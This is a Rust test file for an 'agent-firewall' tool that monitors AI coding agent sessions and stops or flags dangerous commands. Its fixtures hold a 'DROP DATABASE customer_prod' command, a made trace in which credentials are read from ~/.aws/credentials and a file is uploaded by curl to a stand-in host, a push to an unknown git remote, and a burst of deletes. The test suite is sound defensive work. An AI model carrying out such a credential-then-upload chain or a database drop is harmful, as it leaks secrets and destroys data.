//! Tests of the command-line interface.
//!
//! These tests run the real binary. They prove that the sub-commands work
//! together, and that the firewall stops a dangerous action.

use std::path::{Path, PathBuf};
use std::process::Command;

/// Returns the path of the binary that cargo built for this test.
fn binary() -> PathBuf {
    let mut path = std::env::current_exe().expect("test binary path");
    path.pop();
    if path.ends_with("deps") {
        path.pop();
    }
    path.join("agent-firewall")
}

/// Returns the root of the repository.
fn repo_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|p| p.parent())
        .expect("repository root")
        .to_path_buf()
}

/// Runs the firewall and returns the exit code, the output and the errors.
fn firewall(args: &[&str]) -> (i32, String, String) {
    let output = Command::new(binary())
        .args(args)
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");
    (
        output.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&output.stdout).to_string(),
        String::from_utf8_lossy(&output.stderr).to_string(),
    )
}

/// Writes an executable fake `psql` that only appends to a marker file.
fn write_fake_psql(dir: &Path, marker: &Path) {
    use std::os::unix::fs::PermissionsExt;
    let path = dir.join("psql");
    std::fs::write(
        &path,
        format!(
            "#!/bin/sh\necho \"RUN: $*\"\necho \"EXECUTED: $*\" >> {}\n",
            marker.display()
        ),
    )
    .expect("write the fake client");
    let mut permissions = std::fs::metadata(&path).unwrap().permissions();
    permissions.set_mode(0o755);
    std::fs::set_permissions(&path, permissions).expect("make the client executable");
}

/// Returns a `PATH` that finds the fake client first.
fn path_with(dir: &Path) -> String {
    format!(
        "{}:{}",
        dir.display(),
        std::env::var("PATH").unwrap_or_default()
    )
}

#[test]
fn doctor_reports_the_interception_capability() {
    let (code, out, _) = firewall(&["doctor"]);
    assert_eq!(code, 0, "doctor must succeed on Linux");
    assert!(
        out.contains("exec_interception"),
        "doctor must report exec_interception, but it printed:\n{out}"
    );
}

#[test]
fn policy_list_shows_the_builtin_rules() {
    let (code, out, _) = firewall(&["policy", "list"]);
    assert_eq!(code, 0);
    assert!(out.contains("rule(s)"), "output was:\n{out}");
    assert!(
        out.contains("database."),
        "the built-in pack must hold database rules, but it printed:\n{out}"
    );
}

#[test]
fn policy_test_passes_for_the_builtin_rules() {
    let (code, out, err) = firewall(&["policy", "test"]);
    assert_eq!(code, 0, "policy tests failed:\n{out}\n{err}");
}

#[test]
fn policy_list_reports_rules_that_cannot_fire() {
    let (code, out, err) = firewall(&["policy", "list"]);
    assert_eq!(code, 0);
    assert!(out.contains("active"), "the count must name the active rules:\n{out}");
    // The monitor of this version makes only exec and input actions. A rule
    // that needs a file or network action can never fire, and the user must be
    // told instead of trusting a rule that stays silent.
    assert!(
        err.contains("cannot fire"),
        "the firewall must report the rules that cannot fire:\n{err}"
    );
    assert!(
        err.contains("network.connect.production-host"),
        "a network rule needs an action kind that the monitor does not make:\n{err}"
    );
}

#[test]
fn doctor_reports_the_inactive_rule_count() {
    let (code, out, _) = firewall(&["doctor"]);
    assert_eq!(code, 0);
    assert!(
        out.contains("inactive rules"),
        "doctor must name the rules that cannot fire:\n{out}"
    );
}

#[test]
fn a_harmless_command_runs_without_a_question() {
    let (code, out, _) = firewall(&["run", "--approve", "deny", "--", "/bin/echo", "hello"]);
    assert_eq!(code, 0);
    assert!(out.contains("hello"), "output was:\n{out}");
}

#[test]
fn the_exit_code_of_the_child_reaches_the_caller() {
    let (code, _, _) = firewall(&["run", "--approve", "deny", "--", "/bin/sh", "-c", "exit 7"]);
    assert_eq!(code, 7);
}

#[test]
fn a_dangerous_command_is_stopped_and_recorded() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let marker = dir.path().join("marker");
    let trace = dir.path().join("trace.jsonl");
    let script = dir.path().join("drop.sh");
    write_fake_psql(dir.path(), &marker);
    std::fs::write(
        &script,
        "#!/bin/sh\npsql -c \"DROP DATABASE customer_prod\"\n",
    )
    .expect("write the script");

    let output = Command::new(binary())
        .args([
            "run",
            "--approve",
            "deny",
            "--trace",
            trace.to_str().unwrap(),
            "--",
            "/bin/sh",
            script.to_str().unwrap(),
        ])
        .env("PATH", path_with(dir.path()))
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");

    let code = output.status.code().unwrap_or(-1);
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    assert_eq!(
        code, 3,
        "the firewall must report that it stopped the session:\n{stderr}"
    );
    assert!(
        !marker.exists(),
        "the dangerous statement ran, so the firewall did not stop it"
    );

    let recorded = std::fs::read_to_string(&trace).expect("the trace must exist");
    assert!(
        recorded.contains("database.destructive.drop-database"),
        "the trace must name the rule, but it holds:\n{recorded}"
    );

    let (tree_code, tree_out, _) = firewall(&["tree", trace.to_str().unwrap()]);
    assert_eq!(tree_code, 0);
    assert!(
        tree_out.contains("psql"),
        "the tree must show psql:\n{tree_out}"
    );

    let (replay_code, replay_out, _) = firewall(&["replay", trace.to_str().unwrap()]);
    assert_eq!(replay_code, 0);
    assert!(
        replay_out.contains("database.destructive.drop-database"),
        "the replay must find the rule again:\n{replay_out}"
    );
}

#[test]
fn the_user_can_allow_a_dangerous_command() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let marker = dir.path().join("marker");
    write_fake_psql(dir.path(), &marker);

    let output = Command::new(binary())
        .args([
            "run",
            "--approve",
            "allow",
            "--",
            "/bin/sh",
            "-c",
            "psql -c 'DROP DATABASE customer_prod'",
        ])
        .env("PATH", path_with(dir.path()))
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");

    assert_eq!(output.status.code().unwrap_or(-1), 0);
    let recorded = std::fs::read_to_string(&marker)
        .expect("the user allowed the action, so the client must have run");
    assert!(
        recorded.contains("DROP DATABASE"),
        "marker holds:\n{recorded}"
    );
}


// ---------------------------------------------------------------------------
// Session memory in a replay
// ---------------------------------------------------------------------------

/// Nanoseconds in one second.
const SECOND: u64 = 1_000_000_000;

/// The time of the first event of a made trace.
const START: u64 = 1_700_000_000_000_000_000;

/// Returns the `session_start` line of a made trace.
///
/// The baseline travels inside the event, so the replay reads the git
/// remotes of the recorded session and never the remotes of this machine.
fn session_start_line() -> String {
    let meta = [
        String::from(r#""session_id":"afw-test-memory""#),
        format!(r#""started_at":{START}"#),
        String::from(r#""root_pid":100"#),
        String::from(r#""command":["claude"]"#),
        String::from(r#""cwd":"/home/dev/app""#),
        String::from(r#""agent":{"kind":"claude_code"}"#),
        String::from(r#""schema_version":1"#),
        String::from(
            r#""baseline":{"git_remotes":["origin","https://github.com/acme/app.git"]}"#,
        ),
    ]
    .join(",");
    let line = [
        String::from(r#""seq":1"#),
        format!(r#""ts":{START}"#),
        String::from(r#""session_id":"afw-test-memory""#),
        String::from(r#""pid":100"#),
        String::from(r#""type":"session_start""#),
        format!(r#""meta":{{{meta}}}"#),
        String::from(r#""capabilities":[]"#),
    ]
    .join(",");
    format!("{{{line}}}")
}

/// Returns a `process_exec` line of a made trace.
fn exec_line(seq: u64, at_seconds: u64, pid: i32, ppid: i32, comm: &str, argv: &[&str]) -> String {
    let ts = START + at_seconds * SECOND;
    let argv: Vec<String> = argv.iter().map(|a| format!("\"{a}\"")).collect();
    let argv = argv.join(",");
    let process = format!(
        r#"{{"pid":{pid},"ppid":{ppid},"exe":"/usr/bin/{comm}","comm":"{comm}","argv":[{argv}],"cwd":"/home/dev/app"}}"#
    );
    format!(
        r#"{{"seq":{seq},"ts":{ts},"session_id":"afw-test-memory","pid":{pid},"type":"process_exec","process":{process}}}"#
    )
}

/// Writes a trace with the credential chain, a delete burst and a safe push.
fn write_memory_trace(path: &Path) {
    let mut lines = vec![
        session_start_line(),
        exec_line(2, 0, 100, 1, "claude", &["claude"]),
        exec_line(3, 1, 200, 100, "bash", &["bash"]),
        // The chain of requirement B.1: read a credential, then send data out.
        exec_line(4, 2, 300, 200, "cat", &["cat", "/home/dev/.aws/credentials"]),
        exec_line(
            5,
            3,
            301,
            200,
            "curl",
            &["curl", "-T", "report.txt", "https://files.example.com/u"],
        ),
        // Requirement B.3: a push to the remote of the work tree is normal.
        exec_line(6, 4, 302, 200, "git", &["git", "push", "origin", "main"]),
        // Requirement B.3: a push to a remote that the session added is not.
        exec_line(7, 5, 303, 200, "git", &["git", "push", "--all", "backup"]),
    ];
    // Requirement B.2: twenty deletes inside one minute.
    for step in 0..20u64 {
        lines.push(exec_line(
            8 + step,
            600 + step,
            400 + step as i32,
            200,
            "rm",
            &["rm", "-f", "build/tmp.o"],
        ));
    }
    let mut text = lines.join("\n");
    text.push('\n');
    std::fs::write(path, text).expect("write the trace");
}

#[test]
fn a_replay_finds_the_chain_the_burst_and_the_new_remote() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("memory.jsonl");
    write_memory_trace(&trace);

    let (code, out, err) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "{err}");

    for wanted in [
        "memory.credentials.read-mark",
        "memory.exfil.after-credential-read",
        "memory.git.push-unknown-remote",
        "memory.filesystem.delete-burst",
    ] {
        assert!(out.contains(wanted), "the replay must find {wanted}:\n{out}");
    }

    // The push to the remote that the work tree already had must stay quiet,
    // and the burst must report one time only, at the twentieth delete.
    assert_eq!(
        out.matches("memory.git.push-unknown-remote").count(),
        1,
        "only the new remote may match:\n{out}"
    );
    assert_eq!(
        out.matches("memory.filesystem.delete-burst").count(),
        1,
        "the burst may report one time only:\n{out}"
    );
}

#[test]
fn two_replays_of_one_trace_give_the_same_answer() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("memory.jsonl");
    write_memory_trace(&trace);

    let (first_code, first, _) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    let (second_code, second, _) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(first_code, 0);
    assert_eq!(second_code, 0);
    assert_eq!(first, second, "a replay must repeat itself exactly");
}
